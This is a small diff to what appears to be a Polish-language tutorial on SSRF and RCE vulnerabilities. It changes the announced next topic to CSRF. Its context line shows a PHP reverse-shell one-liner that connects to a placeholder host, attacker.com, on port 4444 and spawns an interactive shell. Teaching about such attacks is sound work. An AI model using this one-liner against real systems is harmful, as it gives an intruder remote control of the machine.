@@ -111,4 +111,4 @@ php -r '$sock=fsockopen("attacker.com",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
 
 ---
 
-SSRF i RCE to podatności, które mogą prowadzić do pełnego przejęcia systemu. Kolejnym krokiem będzie analiza podatności **Platformy do ćwiczeń i laby pentesterskie**! 🚀
+SSRF i RCE to podatności, które mogą prowadzić do pełnego przejęcia systemu. Kolejnym krokiem będzie analiza podatności **Cross-Site Request Forgery (CSRF)**! 🚀
